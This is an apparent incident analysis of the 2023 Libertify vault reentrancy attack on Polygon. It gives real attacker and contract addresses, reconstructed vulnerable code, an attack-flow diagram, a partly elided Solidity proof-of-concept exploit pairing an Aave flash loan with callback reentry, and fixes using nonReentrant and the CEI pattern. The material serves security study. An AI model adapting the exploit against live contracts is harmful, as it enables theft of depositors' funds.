# Libertify Reentrancy Incident Analysis

## 1. Overview

| Field | Details |
|------|------|
| Project | Libertify |
| Date | 2023-07-18 |
| Chain | Polygon |
| Loss | ~$452,000 USD |
| Attack Type | Reentrancy + Flash Loan |
| CWE | CWE-841 (Improper Enforcement of Behavioral Workflow) |
| Attacker Address | `0xfd2d3ffb05ad00e61e3c8d8701cb9036b7a16d02` |
| Attack Contract | `0xdfcdb5a86b167b3a418f3909d6f7a2f2873f2969` |
| Vulnerable Contract | `0x9c80a455ecaca7025a45f5fa3b85fd6a462a447b` (LibertiVault) |
| Fork Block | 44,941,584 |

## 2. Vulnerability Code Analysis

LibertiVault's `deposit()` function had no reentrancy protection during `callBytes()` execution. By reentering via the 1inch V4 Router's `callBytes()` callback, an attacker could manipulate `totalSupply` and mint more shares than entitled.

```solidity
// Vulnerable pattern: callBytes reentrancy allowed during deposit
contract LibertiVault {
    uint256 public totalAssets;
    uint256 public totalSupply;

    function deposit(uint256 assets, address receiver) external returns (uint256 shares) {
        // Vulnerable: callBytes executes before totalSupply is updated
        uint256 sharePrice = totalAssets * 1e18 / totalSupply;

        // 1inch callBytes execution (external call — reentrable)
        oneInchRouter.callBytes(/* swap data */);  // Reentrance possible at this point

        // totalAssets update (executes after reentry)
        totalAssets += assets;

        // Excessive shares calculated using manipulated totalSupply
        shares = assets * 1e18 / sharePrice;
        totalSupply += shares;
        _mint(receiver, shares);
    }
}
```

### On-Chain Original Code

Source: Bytecode decompilation

```solidity
// Root cause: Reentrancy + Flash Loan
// Source code unverified — based on bytecode analysis
```

**Vulnerability**: Reentering `deposit()` during the `callBytes()` callback allows an attacker to receive more shares than deserved because `totalSupply` has not yet been updated, leaving the share price inflated.

## 3. Attack Flow

```
Attacker [0xfd2d3ffb05ad00e61e3c8d8701cb9036b7a16d02]
  │
  ├─1─▶ deal() acquire 0.004 WETH
  │
  ├─2─▶ aaveV2.flashLoan() [0x8dFf5E27EA6b7AC08EbFdf9eB090F32ee9a30fcf]
  │      Borrow 5,000,000 USDT (1st loan)
  │
  ├─3─▶ Call LibertiVault.deposit(5M USDT)
  │      [LibertiVault: 0x9c80a455ecaca7025a45f5fa3b85fd6a462a447b]
  │      ├─▶ 1inch callBytes() executes
  │      │    └─▶ Reenter: LibertiVault.deposit() called again
  │      │          (before totalSupply update — inflated share price)
  │      │          → Receive excessive shares
  │      │
  │      └─▶ Original deposit continues (normal shares)
  │
  ├─4─▶ aaveV2.flashLoan() (2nd) borrow additional 5,000,000 USDT
  │      → Repeat same pattern
  │
  ├─5─▶ Redeem excessively obtained shares → USDT withdrawn
  │
  └─6─▶ Repay Aave flash loan + realize ~452K USD profit
```

## 4. PoC Core Code

```solidity
// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.10;

interface ILibertiVault {
    function deposit(uint256 assets, address receiver) external returns (uint256 shares);
    function redeem(uint256 shares, address receiver, address owner) external returns (uint256 assets);
}

contract LibertifyExploit {
    ILibertiVault vault = ILibertiVault(0x9c80a455ecaca7025a45f5fa3b85fd6a462a447b);
    IAaveFlashloan aaveV2 = IAaveFlashloan(0x8dFf5E27EA6b7AC08EbFdf9eB090F32ee9a30fcf);
    IERC20 USDT = IERC20(0xc2132D05D31c914a87C6611C10748AEb04B58e8F);

    bool private _inReentrancy = false;
    uint256 private _reentrantShares;

    function testExploit() external {
        // Acquire 0.004 WETH
        // Execute flash loan twice
        address[] memory assets = new address[](1);
        assets[0] = address(USDT);
        uint256[] memory amounts = new uint256[](1);
        amounts[0] = 5_000_000e6;
        aaveV2.flashLoan(address(this), assets, amounts, new uint256[](1), address(this), "", 0);
    }

    function executeOperation(address[] calldata, uint256[] calldata amounts, ...) external returns (bool) {
        // Call deposit — reenter during callBytes
        uint256 shares = vault.deposit(amounts[0], address(this));

        // Second flash loan
        // ...

        // Redeem excessive shares
        vault.redeem(shares + _reentrantShares, address(this), address(this));
        return true;
    }

    // Reentry from 1inch callBytes callback
    function callbackFromOneInch(bytes calldata data) external {
        if (!_inReentrancy) {
            _inReentrancy = true;
            // Reenter: before totalSupply update
            _reentrantShares = vault.deposit(5_000_000e6, address(this));
            _inReentrancy = false;
        }
    }
}
```

## 5. Vulnerability Classification

| Field | Details |
|------|------|
| CWE | CWE-841 (Improper Enforcement of Behavioral Workflow) |
| Vulnerability Type | Reentrancy, totalSupply manipulation |
| Impact Scope | All USDT liquidity in LibertiVault |
| Explorer | [Polygonscan](https://polygonscan.com/address/0x9c80a455ecaca7025a45f5fa3b85fd6a462a447b) |

## 6. Security Recommendations

```solidity
// Fix 1: Apply nonReentrant (simplest fix)
import "@openzeppelin/contracts/security/ReentrancyGuard.sol";

function deposit(uint256 assets, address receiver) external nonReentrant returns (uint256 shares) {
    uint256 sharePrice = totalAssets * 1e18 / totalSupply;
    totalAssets += assets;  // Update state first
    shares = assets * 1e18 / sharePrice;
    totalSupply += shares;
    _mint(receiver, shares);
    // callBytes after state update
    oneInchRouter.callBytes(/* swap data */);
}

// Fix 2: ERC-4626 standard CEI pattern
function deposit(uint256 assets, address receiver) external returns (uint256 shares) {
    // Check
    require(assets > 0, "Zero assets");

    // Effects (state changes first)
    shares = previewDeposit(assets);
    _mint(receiver, shares);
    totalAssets += assets;

    emit Deposit(msg.sender, receiver, assets, shares);

    // Interactions (external calls last)
    IERC20(asset()).safeTransferFrom(msg.sender, address(this), assets);
    afterDeposit(assets, shares);
}
```

## 7. Lessons Learned

1. **ERC-4626 Standard and Reentrancy**: In ERC-4626 Vault implementations, external DEX calls (1inch, Uniswap, etc.) must always execute after state updates, as the final step.
2. **Polygon DEX Integration Risk**: When integrating aggregator routers like 1inch into a Vault on Polygon, the possibility of callback reentrancy must always be reviewed.
3. **totalSupply Manipulation = Share Price Manipulation**: The Vault's share price is computed as `totalAssets / totalSupply`, so manipulating either component distorts the share price.
4. **CEI Pattern is Mandatory**: The Checks-Effects-Interactions pattern is the fundamental defense against reentrancy. External calls must always be placed last.